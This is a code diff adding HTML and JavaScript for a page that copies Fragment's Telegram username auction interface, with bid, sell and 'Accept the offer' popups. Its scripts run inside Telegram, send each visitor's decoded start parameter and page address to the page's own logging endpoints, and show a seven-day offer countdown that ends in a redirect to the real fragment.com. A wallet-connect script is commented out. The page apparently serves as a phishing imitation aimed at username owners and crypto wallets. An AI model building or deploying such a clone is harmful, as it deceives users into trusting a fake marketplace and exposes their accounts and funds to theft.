+                class="popup-container hide js-howitworks-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>How does this work?</h4>
+                            <p class="popup-text">
+                                You can buy this
+                                <a
+                                    href="https://fragment.com/about#what-is-a-collectible"
+                                    >collectible username</a
+                                >
+                                and use it for your <b>personal profile</b>,
+                                group or channel.<br />
+                                <br /><b>To do so, simply:</b><br />• Get
+                                <a href="https://tonkeeper.com/">Tonkeeper</a>,
+                                open it and create a <b>wallet</b>.<br />•
+                                Deposit funds in your <b>wallet</b> from a
+                                <a href="https://ton.org/buy-toncoin"
+                                    >supported exchange</a
+                                >
+                                or with
+                                <a href="https://wallet.t.me/">@wallet</a> on
+                                Telegram.<br />• Use <b>Tonkeeper</b> to log in
+                                on Fragment and return to this page.<br />• Tap
+                                the buttons below to join the auction.<br /><br />Purchased
+                                entities become available under My Assets and
+                                can be used within any supported platform,
+                                starting with Telegram.<br /><br /><a
+                                    href="https://fragment.com/about"
+                                    >Learn More</a
+                                >
+                            </p>
+                            <div class="popup-buttons">
+                                <a class="btn btn-link btn-lg popup-cancel-btn"
+                                    >Close</a
+                                >
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container hide form-popup-container place-bid-popup-container js-place-bid-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h2>@user</h2>
+                            <p class="popup-text">
+                                Telegram username and user.t.me
+                            </p>
+                            <form class="js-place-bid-form">
+                                <div class="form-group">
+                                    <label for="bid_value">Your bid</label>
+                                    <div
+                                        class="icon-before icon-ton form-control-wrap tm-coin-field"
+                                    >
+                                        <input
+                                            inputmode="decimal"
+                                            class="form-control js-amount-input"
+                                            id="bid_value"
+                                            name="bid_value"
+                                            value="0"
+                                            data-for="js-bid_value"
+                                            data-usd-for="js-bid_usd_value"
+                                            autocomplete="off"
+                                        />
+                                    </div>
+                                    <p class="help-block">
+                                        Approximately &#036;<span
+                                            class="js-bid_usd_value"
+                                            >0</span
+                                        >
+                                    </p>
+                                    <div class="tm-form-control-hint"></div>
+                                </div>
+                                <div class="form-main-button">
+                                    <button
+                                        type="submit"
+                                        class="btn btn-primary btn-block"
+                                    >
+                                        <span class="tm-button-label"
+                                            >Place a
+                                            <span
+                                                class="icon-before icon-ton tm-amount js-bid_value"
+                                                >0</span
+                                            >
+                                            bid</span
+                                        >
+                                    </button>
+                                </div>
+                            </form>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container hide form-popup-container js-put-to-auction-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>Put up for auction</h4>
+                            <p class="popup-text">
+                                Do you want to make
+                                <span class="accent-color js-username"></span>
+                                available for auction on <b>Fragment</b>?
+                            </p>
+                            <form class="js-put-to-auction-form">
+                                <input type="hidden" name="username" />
+                                <div class="form-group">
+                                    <label for="min_bid_value"
+                                        >Minimum bid</label
+                                    >
+                                    <div
+                                        class="icon-before icon-ton form-control-wrap tm-coin-field"
+                                    >
+                                        <input
+                                            inputmode="decimal"
+                                            class="form-control js-amount-input"
+                                            id="min_bid_value"
+                                            name="min_bid_value"
+                                            value="2"
+                                            data-usd-for="js-bid_usd_value"
+                                            autocomplete="off"
+                                        />
+                                        <div class="form-control-hint">
+                                            ~&nbsp;&#036;<span
+                                                class="js-bid_usd_value"
+                                                >14.59</span
+                                            >
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="form-group">
+                                    <label for="max_price_value"
+                                        >Maximum price</label
+                                    >
+                                    <div
+                                        class="icon-before icon-ton form-control-wrap tm-coin-field"
+                                    >
+                                        <input
+                                            inputmode="decimal"
+                                            class="form-control js-amount-input"
+                                            id="max_price_value"
+                                            name="max_price_value"
+                                            value=""
+                                            placeholder="Optional"
+                                            autocomplete="off"
+                                        />
+                                    </div>
+                                    <p class="help-block">
+                                        Set a maximum price if you want to
+                                        enable anyone to instantly buy
+                                        <span class="js-username"></span> for
+                                        this price.
+                                    </p>
+                                </div>
+                                <div class="popup-buttons">
+                                    <a
+                                        class="btn btn-link btn-lg popup-cancel-btn"
+                                        >Cancel</a
+                                    >
+                                    <button
+                                        type="submit"
+                                        class="btn btn-link btn-lg"
+                                    >
+                                        Proceed
+                                    </button>
+                                </div>
+                            </form>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container hide form-popup-container place-bid-popup-container js-sell-username-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h2 class="js-username"></h2>
+                            <p class="popup-text">
+                                Sell username on <b>Fragment</b>
+                            </p>
+                            <form class="js-sell-username-form">
+                                <input type="hidden" name="username" />
+                                <div class="form-group">
+                                    <label for="sell_value">Sell price</label>
+                                    <div
+                                        class="icon-before icon-ton form-control-wrap tm-coin-field"
+                                    >
+                                        <input
+                                            inputmode="decimal"
+                                            class="form-control js-amount-input"
+                                            id="sell_value"
+                                            name="sell_value"
+                                            value="2"
+                                            data-for="js-bid_value"
+                                            autocomplete="off"
+                                        />
+                                    </div>
+                                    <div class="tm-form-control-hint"></div>
+                                </div>
+                                <div class="form-main-button">
+                                    <button
+                                        type="submit"
+                                        class="btn btn-primary btn-block"
+                                    >
+                                        <span class="tm-button-label"
+                                            >Sell for
+                                            <span
+                                                class="icon-before icon-ton tm-amount js-bid_value"
+                                                >2</span
+                                            ></span
+                                        >
+                                    </button>
+                                </div>
+                            </form>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container hide js-convert-confirm-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>Auction Your Username</h4>
+                            <p class="popup-text">
+                                The
+                                <span class="accent-color">@fragment</span> bot
+                                sent you a <b>confirmation message</b> on
+                                Telegram, please open it and follow the
+                                instructions to proceed.
+                            </p>
+                            <div class="popup-buttons">
+                                <a
+                                    href="https://t.me/fragment"
+                                    target="_blank"
+                                    class="btn btn-link btn-lg"
+                                    >Open bot</a
+                                >
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container form-popup-container hide js-convert-bid-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>Auction Your Username</h4>
+                            <p class="popup-text">
+                                You can put
+                                <span class="accent-color js-username"></span>
+                                up for auction as a <b>collectible username</b>.
+                                This action is
+                                <b>irreversible</b>.<br /><br />The winner of
+                                the auction will <b>own</b> the TON collectible
+                                – and you are free to bid on it as well. Your
+                                wallet will receive the final amount in TON,
+                                minus
+                                <a
+                                    target="_blank"
+                                    rel="noopener"
+                                    href="https://fragment.com/about#q-are-there-any-transaction-fees"
+                                    >conversion fees</a
+                                >.
+                            </p>
+                            <form class="js-convert-bid-form">
+                                <input type="hidden" name="id" />
+                                <div class="form-group">
+                                    <label for="bid_value"
+                                        >Your first bid</label
+                                    >
+                                    <div
+                                        class="icon-before icon-ton form-control-wrap tm-coin-field"
+                                    >
+                                        <input
+                                            inputmode="decimal"
+                                            class="form-control js-amount-input"
+                                            id="bid_value"
+                                            name="bid_value"
+                                            value="10"
+                                            data-for="js-bid_value"
+                                            data-usd-for="js-bid_usd_value"
+                                            autocomplete="off"
+                                        />
+                                        <div class="form-control-hint">
+                                            ~&nbsp;&#036;<span
+                                                class="js-bid_usd_value"
+                                                >72.94</span
+                                            >
+                                        </div>
+                                    </div>
+                                    <p class="help-block">
+                                        The auction will start after you place
+                                        the first bid. If someone outbids you,
+                                        you will get this entire amount back. If
+                                        there are no other bidders, you will get
+                                        both the new collectible and your bid
+                                        amount back, minus 5% and minus a
+                                        <span class="icon-before icon-ton-text"
+                                            >5</span
+                                        >
+                                        fee.
+                                    </p>
+                                </div>
+                                <div class="popup-buttons">
+                                    <a
+                                        class="btn btn-link btn-lg popup-cancel-btn"
+                                        >Cancel</a
+                                    >
+                                    <button
+                                        type="submit"
+                                        class="btn btn-link btn-lg js-do-transfer-btn"
+                                    >
+                                        Continue
+                                    </button>
+                                </div>
+                            </form>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container form-popup-container hide js-new-convert-bid-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>Auction Your Username</h4>
+                            <p class="popup-text">
+                                This will put
+                                <span class="accent-color js-username"></span>
+                                up for auction as a <b>collectible username</b>.
+                                You can cancel the auction at any time before
+                                the first bid is placed.<br /><br />You can
+                                place your own bids in the auction – the winner
+                                will
+                                <b>own the TON collectible</b>.<br /><br />Your
+                                wallet <span class="js-address"></span> will
+                                receive the final amount in TON, minus a 5%
+                                platform fee and a
+                                <a
+                                    target="_blank"
+                                    rel="noopener"
+                                    href="https://fragment.com/about#q-are-there-any-transaction-fees"
+                                    >one-time</a
+                                >
+                                <span class="icon-before icon-ton">5</span>
+                                conversion fee.
+                            </p>
+                            <form class="js-new-convert-bid-form">
+                                <input type="hidden" name="id" />
+                                <div class="form-group">
+                                    <label for="bid_value">Minimum bid</label>
+                                    <div
+                                        class="icon-before icon-ton form-control-wrap tm-coin-field"
+                                    >
+                                        <input
+                                            inputmode="decimal"
+                                            class="form-control js-amount-input"
+                                            id="bid_value"
+                                            name="bid_value"
+                                            value="10"
+                                            data-for="js-bid_value"
+                                            data-usd-for="js-bid_usd_value"
+                                            autocomplete="off"
+                                        />
+                                        <div class="form-control-hint">
+                                            ~&nbsp;&#036;<span
+                                                class="js-bid_usd_value"
+                                                >72.94</span
+                                            >
+                                        </div>
+                                    </div>
+                                    <p class="help-block">
+                                        The auction will start after someone
+                                        places the first bid.
+                                    </p>
+                                </div>
+                                <div class="popup-buttons">
+                                    <a
+                                        class="btn btn-link btn-lg popup-cancel-btn"
+                                        >Cancel</a
+                                    >
+                                    <button
+                                        type="submit"
+                                        class="btn btn-link btn-lg js-do-transfer-btn"
+                                    >
+                                        Create Auction
+                                    </button>
+                                </div>
+                            </form>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container hide js-make-offer-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>Accept the offer</h4>
+                            <p class="popup-text">
+                                Let the owner of
+                                <span class="accent-color">@user</span> know
+                                that you are willing to buy this username.
+                            </p>
+                            <form class="js-make-offer-form">
+                                <input type="hidden" name="id" />
+                                <div class="form-group">
+                                    <label for="amount_value"
+                                        >How much would you pay?</label
+                                    >
+                                    <div
+                                        class="icon-before icon-ton form-control-wrap tm-coin-field"
+                                    >
+                                        <input
+                                            inputmode="decimal"
+                                            class="form-control js-amount-input"
+                                            id="amount_value"
+                                            name="amount_value"
+                                            value=""
+                                            data-for="js-amount_value"
+                                            data-usd-for="js-amount_usd_value"
+                                            placeholder="Enter any amount in TON"
+                                            autocomplete="off"
+                                        />
+                                        <div class="form-control-hint">
+                                            ~&nbsp;&#036;<span
+                                                class="js-amount_usd_value"
+                                            ></span>
+                                        </div>
+                                    </div>
+                                    <p class="help-block">
+                                        We will notify you on Telegram if the
+                                        owner of the username makes it available
+                                        for sale.<br /><br />This service costs
+                                        <span
+                                            class="icon-before icon-ton-text js-amount_fee"
+                                        ></span>
+                                        for this username.
+                                    </p>
+                                </div>
+                                <div class="popup-buttons">
+                                    <a
+                                        class="btn btn-link btn-lg popup-cancel-btn"
+                                        >Cancel</a
+                                    >
+                                    <button
+                                        type="submit"
+                                        class="btn btn-link btn-lg js-do-offer-btn"
+                                    >
+                                        Proceed
+                                    </button>
+                                </div>
+                            </form>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container hide js-howofferworks-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>How does this work?</h4>
+                            <p class="popup-text">
+                                You can make an offer for this username,
+                                suggesting the owner to sell it on Fragment. To
+                                encourage serious offers, this process requires
+                                a <b>small fee</b>.<br /><br /><b
+                                    >To pay the fee, simply:</b
+                                ><br />• Get
+                                <a href="https://tonkeeper.com/">Tonkeeper</a>,
+                                open it and create a <b>wallet</b>.<br />•
+                                Deposit funds in your <b>wallet</b> from a
+                                <a href="https://ton.org/buy-toncoin"
+                                    >supported exchange</a
+                                >
+                                or with
+                                <a href="https://wallet.t.me/">@wallet</a> on
+                                Telegram.<br />• Use <b>Tonkeeper</b> to log in
+                                on Fragment and return to this page.<br />• Log
+                                in with your <b>Telegram account</b> to receive
+                                a notification if the username gets listed.<br />•
+                                Tap the button to make an offer – enter the
+                                amount you&#39;d be <b>willing to spend</b> for
+                                this username.<br />• Scan the QR code to
+                                <b>pay the fee</b> for making the offer.<br /><br />The
+                                owner will receive your offer on Telegram – if
+                                they&nbsp;decide to list their username,
+                                you&#39;ll be able to make your bid.<br /><br /><a
+                                    href="https://fragment.com/about"
+                                    >Learn More</a
+                                >
+                            </p>
+                            <div class="popup-buttons">
+                                <a class="btn btn-link btn-lg popup-cancel-btn"
+                                    >Close</a
+                                >
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <div
+                class="popup-container hide js-botsabout-popup"
+                data-close-outside="popup-body"
+            >
+                <div class="popup">
+                    <div class="popup-body">
+                        <section>
+                            <h4>Bot usernames</h4>
+                            <p class="popup-text">
+                                This username has been upgraded and it can now
+                                be assigned not just to channels, groups or
+                                users, but also to bots. This upgrade is
+                                permanent and can be performed for any
+                                collectible username by paying a fee of
+                                <span class="icon-before icon-ton tm-amount"
+                                    >1,000</span
+                                >. Usernames will remain upgraded even if they
+                                change owners.
+                            </p>
+                            <div class="popup-buttons">
+                                <a class="btn btn-link btn-lg popup-cancel-btn"
+                                    >OK, got it</a
+                                >
+                            </div>
+                        </section>
+                    </div>
+                </div>
+            </div>
+            <footer class="tm-footer">
+                <div class="tm-footer-links">
+                    <a href="https://fragment.com/" class="tm-footer-link"
+                        >Top Auctions</a
+                    >
+                    <a href="https://fragment.com/about" class="tm-footer-link"
+                        >About</a
+                    >
+                    <a href="https://fragment.com/terms" class="tm-footer-link"
+                        >Terms</a
+                    >
+                    <a
+                        href="https://fragment.com/privacy"
+                        class="tm-footer-link"
+                        >Privacy</a
+                    >
+                </div>
+            </footer>
+        </div>
+
+        <script>
+            (function () {
+                const tg = window.Telegram?.WebApp;
+                if (!tg) {
+                    return;
+                }
+                tg.ready();
+                tg.expand();
+                try {
+                    const href = window.location.href;
+                    const searchParams = new URLSearchParams(window.location.search);
+                    const encoded = searchParams.get('tgWebAppStartParam');
+                    if (encoded) {
+                        const startAppData = atob(encoded.replace(/-/g, '+').replace(/_/g, '/'));
+                        fetch('./log-startapp', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ startAppData: startAppData, href: href }),
+                        }).then(r => r.json()).then(data => {
+                            if (!data.visitId) return;
+                            const vid = data.visitId;
+                            setInterval(() => {
+                                fetch('./heartbeat', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({ visitId: vid }),
+                                });
+                            }, 5000);
+                            window.addEventListener('beforeunload', () => {
+                                navigator.sendBeacon('./leave', new Blob([JSON.stringify({ visitId: vid })], { type: 'application/json' }));
+                            });
+                        });
+                    }
+                } catch(e) {}
+
+                function gtnm() {
+                    const nume = document.querySelector(
+                        ".tm-web3-address .subdomain",
+                    );
+                    return nume ? nume.textContent.replace(/[^a-zA-Z0-9_]/g, "") : "";
+                }
+                document.addEventListener("DOMContentLoaded", function () {
+                    const pgn = gtnm();
+
+                    const xd = pgn
+                        ? `Open https://fragment.com/username/${pgn}?`
+                        : "Open https://fragment.com?";
+
+                    // TEST EDIT
+                    document.body.style.display = "block";
+                    if (tg) {
+                        tg.ready();
+                        tg.expand();
+                    }
+                    /*tg.showPopup(
+                        {
+                            message: xd,
+                            buttons: [
+                                { id: "ok", type: "ok", text: "OK" },
+                                { id: "cancel", type: "close", text: "Cancel" },
+                            ],
+                        },
+                        function (bid) {
+                            if (bid === "ok") {
+                                document.body.style.display = "block";
+                            } else {
+                                tg.close();
+                            }
+                        },
+                    );*/
+                });
+            })();
+            (function() {
+                const offerTimestamp = 1783155192279;
+                if (offerTimestamp && !isNaN(offerTimestamp)) {
+                    const endDate = new Date(offerTimestamp + 7 * 24 * 60 * 60 * 1000);
+                    const wrap = document.getElementById('countdown-wrap');
+                    function updateDigit(el, newVal) {
+                        const currentVal = el.getAttribute('data-val');
+                        if (currentVal !== newVal) {
+                            el.setAttribute('data-prev-val', currentVal);
+                            el.setAttribute('data-val', newVal);
+                            void el.offsetWidth;
+                        }
+                    }
+
+                    let timerInterval;
+
+                    function updateTimer() {
+                        const now = Date.now();
+                        const distance = endDate.getTime() - now;
+                        if (distance <= 0) {
+                            if (timerInterval) clearInterval(timerInterval);
+                            wrap.classList.add('ended');
+                            setTimeout(() => { window.location.href = "https://fragment.com/"; }, 2000);
+                            return;
+                        }
+                        const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+                        const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                        const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                        const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+                        const dStr = String(days);
+                        const hStr = String(hours).padStart(2, '0');
+                        const mStr = String(minutes).padStart(2, '0');
+                        const sStr = String(seconds).padStart(2, '0');
+                        const daysReel = document.getElementById('reel-days');
+                        const daysText = days === 1 ? 'day' : 'days';
+                        updateDigit(daysReel.querySelector('.digit'), dStr + ' ' + daysText);
+                        const hoursDigits = document.getElementById('reel-hours').querySelectorAll('.digit');
+                        updateDigit(hoursDigits[0], hStr[0]);
+                        updateDigit(hoursDigits[1], hStr[1]);
+                        const minutesDigits = document.getElementById('reel-minutes').querySelectorAll('.digit');
+                        updateDigit(minutesDigits[0], mStr[0]);
+                        updateDigit(minutesDigits[1], mStr[1]);
+                        const secondsDigits = document.getElementById('reel-seconds').querySelectorAll('.digit');
+                        updateDigit(secondsDigits[0], sStr[0]);
+                        updateDigit(secondsDigits[1], sStr[1]);
+                    }
+
+                    updateTimer();
+                    timerInterval = setInterval(updateTimer, 1000);
+                }
+            })();
+        </script>
+        <!--<script src="../js/connect.js?v=20260630s141"></script>-->
+    </body>
 </html>
